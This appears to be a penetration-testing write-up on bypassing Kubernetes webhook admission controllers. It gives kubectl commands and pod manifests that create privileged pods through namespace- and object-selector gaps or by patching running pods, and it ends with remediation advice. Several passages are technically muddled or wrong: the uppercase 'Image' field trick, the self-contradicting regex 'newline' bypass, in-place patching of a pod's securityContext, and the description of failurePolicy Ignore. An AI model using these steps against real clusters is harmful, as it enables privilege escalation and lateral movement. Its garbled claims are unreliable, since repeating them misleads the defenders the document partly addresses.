
# Kubernetes Webhook Admission Controller Bypass Vulnerability

## 1. Overview

### Attack Vector Description

This vulnerability allows an attacker to bypass the security policies enforced by a Kubernetes Webhook Admission Controller. Admission controllers intercept requests to the Kubernetes API server before persistence of the object but after authentication and authorization. If an attacker can craft a request that avoids inspection or is improperly evaluated by the webhook, they can create resources that violate the intended policy, leading to potential privilege escalation, resource exhaustion, or security breaches.

### Potential Impact and Consequences

*   **Privilege Escalation:** An attacker might be able to deploy pods with escalated privileges (e.g., hostNetwork, hostPID, hostIPC, privileged containers) that are otherwise disallowed by the admission controller.
*   **Resource Exhaustion:**  Maliciously crafted objects could consume excessive resources, leading to denial-of-service conditions.
*   **Data Exfiltration/Exposure:**  Bypassing security policies could allow attackers to deploy pods that access sensitive data or exfiltrate it to external sources.
*   **Lateral Movement:**  Successful exploitation can create footholds for attackers to move laterally within the cluster.

### Risk Level Assessment

**Critical/High**

The risk level depends on the nature and scope of the policies enforced by the admission controller. A successful bypass can lead to significant security compromises.  If policies related to pod security are bypassed, then the risk is generally considered Critical.

### Technical Explanation

The vulnerability typically exists due to one or more of the following reasons:

*   **Improper Regular Expression Matching:** The webhook's regex for validating resource names, labels, or other attributes might be flawed, allowing carefully crafted payloads to slip through.
*   **Missing Validation Checks:** The webhook might not perform all necessary checks on the request object.  For example, it might validate the `image` field but not the `imagePullPolicy`.
*   **Data Type Mismatch:** Discrepancies between the expected data type and the actual data type in the request can cause parsing errors and bypass the intended validation logic.
*   **Encoding Issues:**  Improper handling of encoded characters (e.g., URL encoding, Unicode) might allow an attacker to inject malicious content into the request.
*   **Webhook Bugs:**  Software bugs or unexpected behavior in the webhook implementation can lead to bypass opportunities.
*   **Incorrect Scope Definition:**  The webhook might not be configured to intercept all relevant requests, leaving certain namespaces or resource types unprotected.
*   **Incorrect use of admission webhook resources (MutatingWebhookConfiguration or ValidatingWebhookConfiguration).** The resource may not be correctly configured to intercept resources using the objectSelector, namespaceSelector, operationTypes, or apiGroups/apiVersions/resources fields.

### Prerequisites and Conditions Needed

*   Access to a Kubernetes cluster with a deployed Webhook Admission Controller.
*   Knowledge of the Admission Controller's configuration (if possible, but black box testing is also viable).
*   Sufficient privileges to create resources (e.g., Pods, Deployments, Namespaces) in the cluster, or target resources through patching.
*   `kubectl` configured to interact with the Kubernetes cluster.

## 2. Validation and Exploitation Steps

### 2.1 Reconnaissance and Policy Identification

Before attempting to bypass the admission controller, it's helpful to understand its configuration and the policies it enforces.

```bash
kubectl get validatingwebhookconfiguration -o yaml
```

**Explanation:** This command retrieves the configuration of the `ValidatingWebhookConfiguration` resource.
**Why:** Understanding the configuration helps identify the scope, matchers, and potentially the logic used by the webhook.
**Expected Output:** YAML output describing the webhook's configuration, including namespace selectors, object selectors, and failure policy.  Examine the `rules` section to understand what resource types and operations are intercepted.
**What to Look For:**  Pay close attention to:
*   `objectSelector` and `namespaceSelector`: These fields define the scope of the webhook.
*   `rules`: List of resources and operations that trigger the webhook.
*   `failurePolicy`:  Defines how the API server behaves if the webhook fails. If `failurePolicy: Ignore` is set, then the attack will not be evident.
*   The webhook's service details (`service` -> `name`, `namespace`).
**Contribution:**  Provides information about the attack surface and potential bypass opportunities.

```bash
kubectl get mutatingwebhookconfiguration -o yaml
```

**Explanation:** This command retrieves the configuration of the `MutatingWebhookConfiguration` resource.
**Why:** Understanding the configuration helps identify the scope, matchers, and potentially the logic used by the webhook.
**Expected Output:** YAML output describing the webhook's configuration, similar to ValidatingWebhookConfiguration.
**What to Look For:**  Same as with ValidatingWebhookConfiguration. The presence of a MutatingWebhookConfiguration suggests the webhook modifies the requests.
**Contribution:**  Provides information about the attack surface and potential bypass opportunities.

### 2.2 Validation: Attempting a Policy Violation

First, try a simple violation to confirm the admission controller is functioning.  Assume the webhook is supposed to prevent creation of privileged pods.

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: privileged-container
    image: alpine:latest
    securityContext:
      privileged: true
EOF
```

**Explanation:** This attempts to create a privileged pod.
**Why:** To verify the admission controller is actively blocking privileged pod creation.
**Expected Output:** An error message similar to "admission webhook denied the request: Pod is privileged and this is forbidden".  If the pod is created successfully, then the admission controller is not functioning, or does not have a policy to prevent privileged pods from running.
**What to Look For:** The specific error message provided by the webhook.
**Contribution:**  Confirms the admission controller is active and enforces the intended policy (in this example, blocking privileged pods).

### 2.3 Exploitation: Namespace Selector Bypass

If the admission controller only applies to specific namespaces, create a pod in a non-monitored namespace. First, get the list of namespaces to make sure one that's *not* supposed to be monitored exists.

```bash
kubectl get namespaces
```

**Explanation:** Lists all namespaces in the cluster.
**Why:**  To identify a namespace that is *not* monitored by the admission controller.
**Expected Output:** List of namespaces and their status.
**What to Look For:**  Namespaces that do not match the `namespaceSelector` in the Webhook configuration. For instance, if the webhook only applies to namespaces with the label `security=enabled`, create a pod in a namespace *without* that label.  Or, if the webhook only applies to the `default` namespace, create a pod in a newly created or existing namespace called `non-monitored`.
**Contribution:** Helps to determine if a bypass is possible by creating resources in an unmonitored namespace.

If a non-monitored namespace `non-monitored` exists, create a privileged pod in it.

```bash
kubectl create namespace non-monitored
cat <<EOF | kubectl apply -n non-monitored -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod-ns
spec:
  containers:
  - name: privileged-container
    image: alpine:latest
    securityContext:
      privileged: true
EOF
```

**Explanation:** This attempts to create a privileged pod in the `non-monitored` namespace.
**Why:** To exploit a potential bypass if the webhook only applies to specific namespaces and `non-monitored` is not one of them.
**Expected Output:** If the bypass is successful, the pod should be created without any errors. If the admission controller is functioning correctly, you'll see the error message as in step 2.2.
**What to Look For:**  Verify that the pod is running by using `kubectl get pods -n non-monitored`.  Also, check the pod's security context to confirm it is actually privileged.

```bash
kubectl get pod privileged-pod-ns -n non-monitored -o yaml | grep privileged
```

**Explanation:** Retrieve the YAML definition of the created pod and check if the `privileged` field is set to `true`.
**Why:** To confirm the security context of the deployed pod.
**Expected Output:** If the pod is privileged, the output should include: `privileged: true`.
**Contribution:** Verifies if the privilege escalation was successful.

### 2.4 Exploitation: Object Selector Bypass

If the webhook uses an `objectSelector`, we attempt to bypass it.  Assume the webhook only applies to pods with the label `app=protected`. Create a pod *without* that label.

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: unprotected-pod
spec:
  containers:
  - name: unprotected-container
    image: alpine:latest
    securityContext:
      privileged: true
EOF
```

**Explanation:** This attempts to create a privileged pod *without* the `app=protected` label.
**Why:** To exploit a potential bypass if the webhook only applies to specific objects and this pod does not match those criteria.
**Expected Output:** If the bypass is successful, the pod should be created without any errors. If the admission controller is functioning correctly, you'll see the error message as in step 2.2.
**What to Look For:** Verify that the pod is running.

```bash
kubectl get pod unprotected-pod -o yaml | grep privileged
```

**Explanation:** Retrieve the YAML definition of the created pod and check if the `privileged` field is set to `true`.
**Why:** To confirm the security context of the deployed pod.
**Expected Output:** If the pod is privileged, the output should include: `privileged: true`.
**Contribution:** Verifies if the privilege escalation was successful.

### 2.5 Exploitation: Case Sensitivity Bypass (Example)

Some webhooks may incorrectly handle case sensitivity. For example, if the policy only applies to `image: nginx:latest` then attempting to use `Image: nginx:latest` or `image: NGINX:latest` could bypass the policy.  This is a less common vulnerability, but worth attempting if other avenues are blocked.

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: case-bypass-pod
spec:
  containers:
  - name: case-bypass-container
    Image: nginx:latest
EOF
```

**Explanation:** Try to create a Pod and use an uppercase `Image:` field.
**Why:** A case-sensitive check could allow the uppercase `Image` to bypass any filters.
**Expected Output:** If successful, a Pod will be created using the image.

### 2.6 Exploitation: Regular Expression Bypass (Example)

This is more advanced and requires knowledge of the webhook's regex. Suppose the webhook validates image names with a flawed regex, allowing injection. Assume the regex is overly simplistic, like `^nginx:.*$`, meaning it only checks for "nginx:" at the beginning.  Try the following:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: regex-bypass-pod
spec:
  containers:
  - name: regex-bypass-container
    image: nginx:latest-malicious-code
EOF
```

In this case, no regular expression bypass has happened, and the validation has correctly prevented creation of the pod with `privileged=true`, however, if the regex was: `^nginx:` without the `.*$` then creating the following pod might succeed in creating the pod (but with `privileged=false`).

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: regex-bypass-pod
spec:
  containers:
  - name: regex-bypass-container
    image: nginx:latest
    securityContext:
      privileged: true
EOF
```

Now try to bypass the regex by appending a newline character and a privileged image. This is a common technique.

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: regex-bypass-pod2
spec:
  containers:
  - name: regex-bypass-container
    image: nginx:latest
    securityContext:
      privileged: true
    args:
      - sh
      - -c
      - |
        echo "Bypass Attempt"
EOF
```

**Explanation:** Creates a pod using an image that appears to start with "nginx:" to satisfy the regex but contains additional characters or exploits after.
**Why:** This attempts to exploit a flawed regex by crafting an image name that matches the regex but also contains malicious code.
**Expected Output:** If successful, the pod will be created. Inspect the pod to confirm if the malicious code was executed (in this example, it just outputs "Bypass Attempt").
**What to Look For:** The presence of the pod and evidence that the malicious code was executed.

**Note:** Regex bypass attempts are highly dependent on the specific regex used by the webhook. This is only an example.

### 2.7 Exploitation: Patching Existing Resources

Sometimes, webhooks don't correctly handle updates (PATCH requests) to existing resources.

```bash
kubectl patch pod <existing-pod-name> -p '{"spec":{"containers":[{"name":"<existing-container-name>","securityContext":{"privileged": true}}]}}'
```

**Explanation:**  Attempts to patch an existing pod to set the `privileged` flag to `true`.
**Why:**  To exploit a potential bypass if the webhook doesn't properly validate PATCH requests.
**Expected Output:**  If the patch is successful, the pod's security context will be updated.
**What to Look For:**  Check the pod's YAML definition after patching to confirm the `privileged` flag is now `true`.

```bash
kubectl get pod <existing-pod-name> -o yaml | grep privileged
```

**Contribution:**  Verifies if the privilege escalation was successful by patching.

### 2.8 Failure Policy: Ignore

If the failurePolicy is set to `Ignore`, this means that the admission controller will not prevent the resource creation, even if it denies the request. This can be misleading, as you might be sending invalid requests that *would* have been blocked under `failurePolicy: Fail`, so this policy will allow resources to be created but with unexpected results.

### Remediation Recommendations

*   **Robust Validation:** Implement comprehensive and thorough validation logic in the webhook.  Use strict regular expressions, validate all relevant fields, and handle data type conversions correctly.
*   **Scope Definition:**  Carefully define the scope of the webhook using `objectSelector` and `namespaceSelector` to ensure it only applies to the intended resources.
*   **Input Sanitization:**  Sanitize user-provided input to prevent injection attacks.  Escape special characters and handle encoding issues appropriately.
*   **Regular Security Audits:**  Conduct regular security audits of the webhook implementation to identify and fix vulnerabilities.
*   **Automated Testing:**  Implement automated tests to ensure the webhook functions as expected and that changes do not introduce new vulnerabilities.
*   **Least Privilege:**  Run the webhook with the least necessary privileges to minimize the impact of a potential compromise.
*   **Update and Patch:** Keep the webhook libraries and dependencies up to date to patch known vulnerabilities.
*   **Failure Policy:** Carefully consider the `failurePolicy` setting. While `Ignore` might seem convenient, it can mask vulnerabilities. `Fail` ensures that invalid requests are blocked. Use `failurePolicy: Fail` unless you have a very good reason not to.
*   **Immutable Infrastructure:**  Consider using immutable infrastructure and policy-as-code tools to manage the admission controller configuration in a more controlled and auditable manner.
*   **Review Patching Behavior:** Ensure that webhooks correctly validate PATCH requests and that updates cannot bypass security policies.
